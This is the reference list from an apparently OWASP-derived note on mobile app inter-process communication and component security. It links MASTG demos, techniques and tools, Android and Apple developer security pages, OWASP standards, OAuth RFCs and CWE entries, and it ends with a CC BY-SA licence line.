- OWASP MASTG — demos [MASTG-DEMO-0128](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0128/MASTG-DEMO-0128/), [MASTG-DEMO-0129](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0129/MASTG-DEMO-0129/), [MASTG-DEMO-0130](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0130/MASTG-DEMO-0130/), [MASTG-DEMO-0120](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0120/MASTG-DEMO-0120/), [MASTG-DEMO-0121](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0121/MASTG-DEMO-0121/), [MASTG-DEMO-0122](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0122/MASTG-DEMO-0122/), [MASTG-DEMO-0123](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0123/MASTG-DEMO-0123/), [MASTG-DEMO-0102](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0102/MASTG-DEMO-0102/) (CC BY-SA 4.0)
- OWASP MASTG — techniques [MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/), [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0017](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0017/), [MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/), [MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/), [MASTG-TECH-0148](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0148/), [MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/), [MASTG-TECH-0159](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0159/), [MASTG-TECH-0160](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0160/), [MASTG-TECH-0161](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0161/), [MASTG-TECH-0162](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0162/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0111](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0111/), [MASTG-TECH-0166](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0166/) (CC BY-SA 4.0)
- OWASP MASTG — tools [adb (MASTG-TOOL-0004)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0004/), [Apktool (MASTG-TOOL-0011)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0011/), [drozer (MASTG-TOOL-0015)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0015/), [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/), [aapt2 (MASTG-TOOL-0124)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0124/), [Frida (MASTG-TOOL-0031)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/), [objection (MASTG-TOOL-0038)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0038/), [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/) (CC BY-SA 4.0)
- [Android Developers — Security risks: android:exported](https://developer.android.com/privacy-and-security/risks/android-exported), [Permission-based access control to exported components](https://developer.android.com/privacy-and-security/risks/access-control-to-exported-components), [Custom permissions](https://developer.android.com/privacy-and-security/risks/custom-permissions), [Insecure broadcast receivers](https://developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver), [Sticky broadcasts](https://developer.android.com/privacy-and-security/risks/sticky-broadcast), [Intent redirection](https://developer.android.com/privacy-and-security/risks/intent-redirection), [Pending intents](https://developer.android.com/privacy-and-security/risks/pending-intent), [Content resolvers](https://developer.android.com/privacy-and-security/risks/content-resolver), [File providers](https://developer.android.com/privacy-and-security/risks/file-providers)
- [Android Developers — Security tips](https://developer.android.com/privacy-and-security/security-tips) (IPC, services, broadcast receivers, content providers, Binder and Messenger interfaces)
- [Android Developers — Behaviour changes: Android 12](https://developer.android.com/about/versions/12/behavior-changes-12#exported), [Android 13](https://developer.android.com/about/versions/13/behavior-changes-13), [Android 14 runtime-registered receivers](https://developer.android.com/about/versions/14/behavior-changes-14#runtime-receivers-exported) and [safer intents](https://developer.android.com/about/versions/14/behavior-changes-14#safer-intents); [Package visibility filtering](https://developer.android.com/training/package-visibility)
- [Android Developers — `<permission>` and `android:protectionLevel`](https://developer.android.com/guide/topics/manifest/permission-element), [Define a custom app permission](https://developer.android.com/guide/topics/permissions/defining), [`<provider>`](https://developer.android.com/guide/topics/manifest/provider-element), [`<path-permission>`](https://developer.android.com/guide/topics/manifest/path-permission-element), [`ContentProvider.call()`](https://developer.android.com/reference/android/content/ContentProvider#call(java.lang.String,%20java.lang.String,%20android.os.Bundle)), [`SQLiteQueryBuilder`](https://developer.android.com/reference/android/database/sqlite/SQLiteQueryBuilder), [`FileProvider`](https://developer.android.com/reference/androidx/core/content/FileProvider)
- [Android Developers — Bound services](https://developer.android.com/develop/background-work/services/bound-services), [AIDL](https://developer.android.com/develop/background-work/services/aidl), [`Binder`](https://developer.android.com/reference/android/os/Binder), [`PackageManager.hasSigningCertificate`](https://developer.android.com/reference/android/content/pm/PackageManager#hasSigningCertificate(int,%20byte%5B%5D,%20int)), [`PendingIntent`](https://developer.android.com/reference/android/app/PendingIntent), [`StrictMode.VmPolicy.Builder.detectUnsafeIntentLaunch()`](https://developer.android.com/reference/android/os/StrictMode.VmPolicy.Builder#detectUnsafeIntentLaunch())
- [Apple — Defining a custom URL scheme for your app](https://developer.apple.com/documentation/xcode/defining-a-custom-url-scheme-for-your-app), [Supporting associated domains](https://developer.apple.com/documentation/xcode/supporting-associated-domains), [`UIScene.OpenURLOptions.sourceApplication`](https://developer.apple.com/documentation/uikit/uiscene/openurloptions/sourceapplication), [Configuring app groups](https://developer.apple.com/documentation/xcode/configuring-app-groups), [App Extension Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/index.html)
- [OWASP ASVS 5.0](https://owasp.org/www-project-application-security-verification-standard/) (V6 Authentication, V7 Session Management, V8 Authorization) and [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/) (WSTG-ATHN-04, WSTG-ATHZ-02)
- [RFC 8252: OAuth 2.0 for Native Apps](https://www.rfc-editor.org/rfc/rfc8252), [RFC 7636: PKCE](https://www.rfc-editor.org/rfc/rfc7636), [RFC 9700: OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700)
- [drozer (Reversec Labs)](https://github.com/ReversecLabs/drozer), [objection](https://github.com/sensepost/objection), [Frida](https://frida.re/docs/android/)
- CWE: [CWE-306](https://cwe.mitre.org/data/definitions/306.html), [CWE-749](https://cwe.mitre.org/data/definitions/749.html), [CWE-862](https://cwe.mitre.org/data/definitions/862.html), [CWE-863](https://cwe.mitre.org/data/definitions/863.html), [CWE-923](https://cwe.mitre.org/data/definitions/923.html), [CWE-926](https://cwe.mitre.org/data/definitions/926.html), [CWE-939](https://cwe.mitre.org/data/definitions/939.html), [CWE-940](https://cwe.mitre.org/data/definitions/940.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
